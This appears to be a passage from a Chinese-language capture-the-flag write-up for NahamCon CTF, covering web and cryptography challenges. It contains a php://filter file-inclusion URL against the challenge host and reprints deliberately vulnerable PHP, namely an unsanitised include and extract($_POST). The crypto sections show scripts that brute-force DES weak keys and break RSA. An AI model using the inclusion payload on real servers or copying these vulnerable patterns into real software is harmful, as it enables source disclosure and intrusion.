rel="noopener">http://jh2i.com:50002/?file=php://filter/read=convert.base64-encode/resource=index.php</a> 得到index.php源码。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Phphonebook<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"main.css"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$file=$_GET[<span class="string">'file'</span>];</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(!<span class="keyword">isset</span>($file))</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"Sorry! You are in /index.php/?file="</span>;</span></span><br><span class="line"><span class="php">&#125; <span class="keyword">else</span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">include</span>(str_replace(<span class="string">'.php'</span>,<span class="string">''</span>,$_GET[<span class="string">'file'</span>]).<span class="string">".php"</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">die</span>();</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>The phonebook is located at <span class="tag">&lt;<span class="name">code</span>&gt;</span>phphonebook.php<span class="tag">&lt;/<span class="name">code</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"position:fixed; bottom:1%; left:1%;"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">b</span>&gt;</span> NOT CHALLENGE RELATED:<span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span>THANK YOU to INTIGRITI for supporting NahamCon and NahamCon CTF!</span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">width</span>=<span class="string">600px</span> <span class="attr">src</span>=<span class="string">"https://d24wuq6o951i2g.cloudfront.net/img/events/id/457/457748121/assets/f7da0d718eb77c83f5cb6221a06a2f45.inti.png"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>发现有waf ，file提交的参数里‘.php’会被过滤，并在末尾强制加上‘.php’.</p><p>同时发现phphonebook.php。同样用文件包含得到源码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;en&quot;&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;Phphonebook&lt;&#x2F;title&gt;</span><br><span class="line">    &lt;link href&#x3D;&quot;main.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class="line">  &lt;&#x2F;head&gt;</span><br><span class="line"></span><br><span class="line">  &lt;body class&#x3D;&quot;bg&quot;&gt;</span><br><span class="line">    &lt;h1 id&#x3D;&quot;header&quot;&gt; Welcome to the Phphonebook &lt;&#x2F;h1&gt;</span><br><span class="line"></span><br><span class="line">    &lt;div id&#x3D;&quot;im_container&quot;&gt;</span><br><span class="line"></span><br><span class="line">      &lt;img src&#x3D;&quot;book.jpg&quot; width&#x3D;&quot;50%&quot; height&#x3D;&quot;30%&quot;&#x2F;&gt;</span><br><span class="line"></span><br><span class="line">      &lt;p class&#x3D;&quot;desc&quot;&gt;</span><br><span class="line">      This phphonebook was made to look up all sorts of numbers! Have fun...</span><br><span class="line">      &lt;&#x2F;p&gt;</span><br><span class="line"></span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">      &lt;form method&#x3D;&quot;POST&quot; action&#x3D;&quot;#&quot;&gt;</span><br><span class="line">        &lt;label id&#x3D;&quot;form_label&quot;&gt;Enter number: &lt;&#x2F;label&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;number&quot;&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;Submit&quot;&gt;</span><br><span class="line">      &lt;&#x2F;form&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line">    &lt;div id&#x3D;&quot;php_container&quot;&gt;</span><br><span class="line">    &lt;?php</span><br><span class="line">      extract($_POST);</span><br><span class="line"></span><br><span class="line">    if (isset($emergency))&#123;</span><br><span class="line">    echo(file_get_contents(&quot;&#x2F;flag.txt&quot;));</span><br><span class="line">    &#125;</span><br><span class="line">    ?&gt;</span><br><span class="line">  &lt;&#x2F;div&gt;</span><br><span class="line">  &lt;&#x2F;br&gt;</span><br><span class="line">  &lt;&#x2F;br&gt;</span><br><span class="line">  &lt;&#x2F;br&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;div style&#x3D;&quot;position:fixed; bottom:1%; left:1%;&quot;&gt;</span><br><span class="line">&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">&lt;b&gt; NOT CHALLENGE RELATED:&lt;&#x2F;b&gt;&lt;br&gt;THANK YOU to INTIGRITI for supporting NahamCon and NahamCon CTF!</span><br><span class="line">&lt;p&gt;</span><br><span class="line">&lt;img width&#x3D;600px src&#x3D;&quot;https:&#x2F;&#x2F;d24wuq6o951i2g.cloudfront.net&#x2F;img&#x2F;events&#x2F;id&#x2F;457&#x2F;457748121&#x2F;assets&#x2F;f7da0d718eb77c83f5cb6221a06a2f45.inti.png&quot;&gt;</span><br><span class="line">&lt;&#x2F;p&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line">  &lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>发现只要以post提交了emergency变量就可以得到flag</p><p><img src="image-20200616001450290.png" alt="image-20200616001450290"></p><h2 id="Cryptography"><a href="#Cryptography" class="headerlink" title="Cryptography"></a>Cryptography</h2><h3 id="Homecooked"><a href="#Homecooked" class="headerlink" title="Homecooked"></a>Homecooked</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">num = <span class="number">0</span></span><br><span class="line">count = <span class="number">0</span></span><br><span class="line">cipher_b64 = <span class="string">b"MTAwLDExMSwxMDAsOTYsMTEyLDIxLDIwOSwxNjYsMjE2LDE0MCwzMzAsMzE4LDMyMSw3MDIyMSw3MDQxNCw3MDU0NCw3MTQxNCw3MTgxMCw3MjIxMSw3MjgyNyw3MzAwMCw3MzMxOSw3MzcyMiw3NDA4OCw3NDY0Myw3NTU0MiwxMDAyOTAzLDEwMDgwOTQsMTAyMjA4OSwxMDI4MTA0LDEwMzUzMzcsMTA0MzQ0OCwxMDU1NTg3LDEwNjI1NDEsMTA2NTcxNSwxMDc0NzQ5LDEwODI4NDQsMTA4NTY5NiwxMDkyOTY2LDEwOTQwMDA="</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">a</span><span class="params">(num)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> (num &gt; <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>,num):</span><br><span class="line">            <span class="keyword">if</span> (num % i) == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">       </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">b</span><span class="params">(num)</span>:</span></span><br><span class="line">    my_str = str(num)</span><br><span class="line">    rev_str = reversed(my_str)</span><br><span class="line">    <span class="keyword">if</span> list(my_str) == list(rev_str):</span><br><span class="line">       <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">       <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cipher = base64.b64decode(cipher_b64).decode().split(<span class="string">","</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(count &lt; len(cipher)):</span><br><span class="line">    <span class="keyword">if</span> (a(num)):</span><br><span class="line">        <span class="keyword">if</span> (b(num)):</span><br><span class="line">            print(chr(int(cipher[count]) ^ num), end=<span class="string">''</span>, flush=<span class="literal">True</span>)</span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> (count == <span class="number">13</span>):</span><br><span class="line">                num = <span class="number">50000</span></span><br><span class="line">            <span class="keyword">if</span> (count == <span class="number">26</span>):</span><br><span class="line">                num = <span class="number">500000</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    num+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">print()</span><br></pre></td></tr></table></figure><p>粗略审计mian代码了解大概函数流程：当a()与b()返回结果为True 时（函数a的作用是判num是否为质数，函数b的作用是判断num是否为回数。），输出cipher[count]与num相与的字符串。且在才count==13时num陡然变为5000 在count==26时num陡然变为50000。</p><p>cipher_b64 经过解密分析cipher为一个字符串列表：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cipher&#x3D;[100,111,100,96,112,21,209,166,216,140,330,318,321,70221,70414,70544,71414,71810,72211,72827,73000,73319,73722,74088,74643,75542,1002903,1008094,1022089,1028104,1035337,1043448,1055587,1062541,1065715,1074749,1082844,1085696,1092966,1094000]</span><br></pre></td></tr></table></figure><p>发现cipher刚好在第13个元素后及第26后元素大小突然猛增。</p><p>因此推测这是一个解密脚本，而flag应该是print输出的结果。按道理直接运行就可以得flag。</p><p>于执行代码：</p><p><img src="image-20200616093343738.png" alt="image-20200616093343738"></p><p>发现果然运行就可以得flag，但flag分三部分给，第二部分给的慢，第三部分更慢。</p><p>推测是考点 因该是提高解密脚本效率</p><p>仔细审计代码,发现函数a</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">a</span><span class="params">(num)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> (num &gt; <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>,num):</span><br><span class="line">            <span class="keyword">if</span> (num % i) == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><p>这个代码的时间复杂度为N。有很大的优化空间。</p><h4 id="解法1："><a href="#解法1：" class="headerlink" title="解法1："></a>解法1：</h4><p><strong>根据数论，如果X不能被2到根号X之间的任一整数整除,则不是质数。</strong></p><p>我们可以优化函数a为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">a</span><span class="params">(num)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> (num &gt; <span class="number">1</span>):</span><br><span class="line">         <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>, int(num ** <span class="number">0.5</span>) + <span class="number">1</span>):</span><br><span class="line">             <span class="keyword">if</span> num % i == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">         <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><p>这样下来函数a的空间效率只有√N。</p><h4 id="解法2："><a href="#解法2：" class="headerlink" title="解法2："></a>解法2：</h4><p><strong>偶数中除了2都不是质数，且奇数的因数也没有偶数</strong>，因此可以进一步优化a函数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">a</span><span class="params">(num)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> (num &gt; <span class="number">1</span>):</span><br><span class="line">     <span class="keyword">if</span> num == <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">     <span class="keyword">elif</span> num % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">     <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>, int(num ** <span class="number">0.5</span>) + <span class="number">1</span>, <span class="number">2</span>):</span><br><span class="line">        <span class="keyword">if</span> num % i == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">     <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><p>这样来函数a的空间效率只有√N/2。</p><h4 id="解法3："><a href="#解法3：" class="headerlink" title="解法3："></a>解法3：</h4><p>利用<strong>6N±1素数筛选法</strong>任何一个自然数，总可以表示成如下形式之一：</p><p>6N,6N+1,6N+2,6N+3,6N+4,6N+5 (N=0,1,2,3,..),显然，当N≥1时，6N，6N+2,6N+3,6N+4都不是素数，只有形如6N+1和6N+5的自然数才可能是素数，所以除了2，3外，所有的素数都可以表示成6N±1的形式(N=0,1,2,3,..)，根据上述分析可以构造一面筛子，只对形如6N±1的自然数进行筛选，来减少筛选的次数。故可以修改a函数为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">a</span><span class="params">(num)</span>:</span></span><br><span class="line"> <span class="keyword">if</span> (num &gt; <span class="number">1</span>):</span><br><span class="line">    <span class="keyword">if</span> (num == <span class="number">2</span>) <span class="keyword">or</span> (num == <span class="number">3</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> (num % <span class="number">6</span> != <span class="number">1</span>) <span class="keyword">and</span> (num % <span class="number">6</span> != <span class="number">5</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>, int(num ** <span class="number">0.5</span>) + <span class="number">1</span>, <span class="number">6</span>):</span><br><span class="line">        <span class="keyword">if</span> (num % i == <span class="number">0</span>) <span class="keyword">or</span> (num % (i + <span class="number">2</span>) == <span class="number">0</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"> <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><h3 id="December"><a href="#December" class="headerlink" title="December"></a>December</h3><p>source.py：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'flag.txt'</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> handle:</span><br><span class="line">flag = handle.read()</span><br><span class="line"></span><br><span class="line">padding_size = len(flag) + (<span class="number">8</span> - ( len(flag) % <span class="number">8</span> ))</span><br><span class="line">flag = flag.ljust(padding_size, <span class="string">b'\x00'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'key'</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> handle:</span><br><span class="line">key = handle.read().strip()</span><br><span class="line"></span><br><span class="line">iv = <span class="string">"13371337"</span></span><br><span class="line">des = DES.new(key, DES.MODE_OFB, iv)</span><br><span class="line">ct = des.encrypt(flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'ciphertext'</span>,<span class="string">'wb'</span>) <span class="keyword">as</span> handle:</span><br><span class="line">handle.write(ct)</span><br></pre></td></tr></table></figure><p>ciphertext：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">症o迩\&quot;郥^N@]X蹶i1鱑WETR^D垶b裓*?^VAAVC绀n?I鬩RTLE[ZD荩y擅&#x2F;蚗l]RTWN7</span><br></pre></td></tr></table></figure><p>根据分析这两个文件。推测这是一道DES.MODE_OFB的知道加密方式破解原文。再仔细审计加密脚本。发现没有告诉我们DES.MODE_OFB加密的原始key。</p><p>于是，经过谷歌后发现这可能是考DES.MODE_OFB的弱key(详细请移步<a href="https://en.wikipedia.org/wiki/Weak_key#Weak_keys_in_DES)。" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Weak_key#Weak_keys_in_DES)。</a></p><p>写脚本用常见弱key进行爆破：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Cipher import DES</span><br><span class="line"></span><br><span class="line">f &#x3D; open(&#39;ciphertext&#39;, &#39;rb&#39;)</span><br><span class="line">ciphertext &#x3D; f.read()</span><br><span class="line">f.close()</span><br><span class="line">IV &#x3D; b&#39;13371337&#39;</span><br><span class="line">KEY&#x3D;b&#39;\x00\x00\x00\x00\x00\x00\x00\x00&#39;</span><br><span class="line">a &#x3D; DES.new(KEY, DES.MODE_OFB, IV)</span><br><span class="line">plaintext &#x3D; a.decrypt(ciphertext)</span><br><span class="line">print (plaintext)</span><br><span class="line"></span><br><span class="line">KEY&#x3D;b&#39;\x1E\x1E\x1E\x1E\x0F\x0F\x0F\x0F&#39;</span><br><span class="line">a &#x3D; DES.new(KEY, DES.MODE_OFB, IV)</span><br><span class="line">plaintext &#x3D; a.decrypt(ciphertext)</span><br><span class="line">print (plaintext)</span><br><span class="line"></span><br><span class="line">KEY&#x3D;&quot;\xE1\xE1\xE1\xE1\xF0\xF0\xF0\xF0&quot;</span><br><span class="line">a &#x3D; DES.new(KEY, DES.MODE_OFB, IV)</span><br><span class="line">plaintext &#x3D; a.decrypt(ciphertext)</span><br><span class="line">print (plaintext)</span><br><span class="line"></span><br><span class="line">KEY&#x3D;&quot;\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF&quot;</span><br><span class="line">a &#x3D; DES.new(KEY, DES.MODE_OFB, IV)</span><br><span class="line">plaintext &#x3D; a.decrypt(ciphertext)</span><br><span class="line">print (plaintext)</span><br></pre></td></tr></table></figure><h3 id="Unvreakable-Vase"><a href="#Unvreakable-Vase" class="headerlink" title="Unvreakable Vase"></a>Unvreakable Vase</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zmxhz3tkb2vzx3roaxnfzxzlbl9jb3vudf9hc19jcnlwdg9vb30&#x3D;</span><br></pre></td></tr></table></figure><p>观测题目所给密文,发现是base64。密文中的大小写都变成小写。</p><p>我们可以根据不断测试大小写字符加语法判断，进行手动猜测…..</p><p><code>flag{does_this_even_count_as_cryptooo}</code></p><p>做完后，大佬才知道有专门的脚本还原(눈_눈)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode <span class="keyword">as</span> decode</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"></span><br><span class="line">data = <span class="string">'zmxhz3tkb2vzx3roaxnfzxzlbl9jb3vudf9hc19jcnlwdg9vb30='</span></span><br><span class="line">CHARSET = <span class="string">'abcdefghijklmnopqrstuvwxyz_&#123;&#125;'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">case_variations</span><span class="params">(string)</span>:</span></span><br><span class="line">    possibilities = []</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> string:</span><br><span class="line">        possibilities.append([char.lower(), char.upper()])</span><br><span class="line">    <span class="keyword">return</span> [<span class="string">""</span>.join(perm) <span class="keyword">for</span> perm <span class="keyword">in</span> product(*possibilities)]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="string">b""</span></span><br><span class="line">real_data = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(data), <span class="number">4</span>):</span><br><span class="line">    crib = data[i:i + <span class="number">4</span>]</span><br><span class="line">    <span class="keyword">for</span> case_variation <span class="keyword">in</span> case_variations(crib):</span><br><span class="line">        <span class="keyword">if</span> all(chr(char) <span class="keyword">in</span> CHARSET <span class="keyword">for</span> char <span class="keyword">in</span> decode(case_variation)):</span><br><span class="line">            real_data += case_variation</span><br><span class="line">            flag += decode(case_variation)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">print(real_data)</span><br></pre></td></tr></table></figure><h3 id="Ooo-la-la"><a href="#Ooo-la-la" class="headerlink" title="Ooo-la-la"></a>Ooo-la-la</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">N &#x3D; 3349683240683303752040100187123245076775802838668125325785318315004398778586538866210198083573169673444543518654385038484177110828274648967185831623610409867689938609495858551308025785883804091</span><br><span class="line">e &#x3D; 65537</span><br><span class="line">c &#x3D; 87760575554266991015431110922576261532159376718765701749513766666239189012106797683148334771446801021047078003121816710825033894805743112580942399985961509685534309879621205633997976721084983</span><br></pre></td></tr></table></figure><p>传统的RSA加密，yafu N到pq 带到脚本即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes,bytes_to_long,getPrime,isPrime</span><br><span class="line">N = <span class="number">3349683240683303752040100187123245076775802838668125325785318315004398778586538866210198083573169673444543518654385038484177110828274648967185831623610409867689938609495858551308025785883804091</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">87760575554266991015431110922576261532159376718765701749513766666239189012106797683148334771446801021047078003121816710825033894805743112580942399985961509685534309879621205633997976721084983</span></span><br><span 